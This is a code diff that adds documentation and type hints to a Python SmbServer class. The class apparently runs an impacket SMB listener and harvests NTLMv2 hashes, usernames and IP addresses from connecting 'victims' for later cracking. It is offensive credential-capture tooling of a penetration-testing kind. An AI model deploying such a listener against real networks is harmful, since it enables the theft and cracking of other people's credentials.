@@ -14,17 +14,22 @@ from tabulate import tabulate
 
 
 class SmbServer:
+    """[ Class that contains the configuration for the smbserver ]
+
+    Args:
+        lhost (str): [ ip of the host that will start the smb server ]
+        port (str): [ port for the smb server ]
+        output ([type], optional): [ Output of the information collected ]. Defaults to sys.stdout.
+    """
+
     def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
         self._lhost = lhost
         self._port = port
         self._output = output
-        self._log_stream = StringIO()
-        self._users_collected = []
 
-        logging.basicConfig(handlers=[InterceptHandler()], level=0)
-        console = logging.StreamHandler(self.log_stream)
-        console.setLevel(logging.INFO)
-        logging.getLogger("").addHandler(console)
+        self._log_stream = StringIO()  # Logging info to the stdout
+        self._users_collected = []  # Users showed to the user
+        self.catch_info()
 
     @property
     def users_collected(self) -> List[str]:
@@ -35,7 +40,7 @@ class SmbServer:
         self._users_collected.append(new_user)
 
     @property
-    def log_stream(self):
+    def log_stream(self) -> StringIO:
         return self._log_stream
 
     @property
@@ -55,7 +60,7 @@ class SmbServer:
         self._lhost = lhost
 
     @port.setter
-    def port(self, port) -> None:
+    def port(self, port: str) -> None:
         self._port = port
 
     @output.setter
@@ -66,8 +71,25 @@ class SmbServer:
     def log_stream(self, stream: StringIO) -> None:
         self._log_stream = stream
 
+    def catch_info(self):
+        """[Function to redirect the output of the class from impacket
+        smbserver to loguru and log_stream]
+        """
+        logging.basicConfig(handlers=[InterceptHandler()], level=0)
+        console = logging.StreamHandler(self.log_stream)
+        console.setLevel(logging.INFO)
+        logging.getLogger("").addHandler(console)
+
     def user_info(self, i: int, user_info_matches: str) -> Tuple[str, str]:
-        #esto es una prueba amigos
+        """[ Function to take interesting information about the user ]
+
+        Args:
+            i (int): [ index of the current user ]
+            user_info_matches (str): [ User information ]
+
+        Returns:
+            Tuple[str, str]: [ Name of the user and the name of the server ]
+        """
         normalize_user_info = (
             user_info_matches[i].split()[1].replace("(", "").replace(")", "").split(",")
         )
@@ -76,6 +98,15 @@ class SmbServer:
         return user, server_name
 
     def connection_info(self, i: int, connection_info_matches: str) -> Tuple[str, str]:
+        """[ Function to tkae interesting information about the connection ]
+
+        Args:
+            i (int): [ index of the current connection ]
+            connection_info_matches (str): [ Connection information ]
+
+        Returns:
+            Tuple[str, str]: [ the ip of the victim and the port used ]
+        """
         normalize_connection_info = (
             connection_info_matches[i]
             .split()[2]
@@ -87,12 +118,33 @@ class SmbServer:
         remote_port = normalize_connection_info[1]
         return remote_ip, remote_port
 
-    def color_output(self, word, color):
+    def color_output(self, word: str, color: Fore) -> str:
+        """[ Function to color a word ]
+
+        Args:
+            word (str): [ Word to be colored ]
+            color (Fore): [ Color chosen ]
+
+        Returns:
+            str: [ Colored word ]
+        """
         return f"{color}{word}{Style.RESET_ALL}"
 
     def show_collected_info(
-        self, i, ntlmv2_hash: str, user_info_matches: str, connection_info_matches: str
+        self,
+        i: int,
+        ntlmv2_hash: str,
+        user_info_matches: str,
+        connection_info_matches: str,
     ) -> None:
+        """[ Information of the victim ]
+
+        Args:
+            i ( int ): [ index of the current victim ]
+            ntlmv2_hash (str): [ hash to be cracked  ]
+            user_info_matches (str): [ user information collected from regular expresion ]
+            connection_info_matches (str): [ connection information collected from regular expresion]
+        """
         user, server_name = self.user_info(i, user_info_matches)
         if user not in self.users_collected:
             remote_ip, remote_port = self.connection_info(i, connection_info_matches)
@@ -117,9 +169,12 @@ class SmbServer:
                 f'{self.color_output("NTLMv2", Fore.BLUE)} : {self.color_output(ntlmv2_hash,Fore.YELLOW)}'
             )
         else:
-            print(f"NTLMv2 hash of user {user} shown above")
+            print(
+                f"{Fore.YELLOW}NTLMv2 hash of user {user} shown above{Style.RESET_ALL}"
+            )
 
-    def generate_output(self):
+    def generate_output(self) -> None:
+        """[ Collected information of the targets ]"""
         pattern_for_ntlmv2_hash = re.compile(r".*::.*")
         pattern_for_user_info = re.compile(r"AUTHENTICATE_MESSAGE .*")
         pattern_for_connection_info = re.compile(r"Incoming connection .*")
@@ -135,7 +190,8 @@ class SmbServer:
                 i, ntlmv2_hash, user_info_matches, connection_info_matches
             )
 
-    def show_ntlmv2(self):
+    def show_ntlmv2(self) -> None:
+        """[ Function to show the information collected in log_stream ]"""
         while True:
             sleep(2)
             if self.log_stream.getvalue() != "":
@@ -144,6 +200,7 @@ class SmbServer:
             self.log_stream.seek(0)
 
     def start_smbserver(self) -> None:
+        """[ Function to start the smb server ]"""
         show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
         show_ntlmv2_thread.daemon = True
         show_ntlmv2_thread.start()
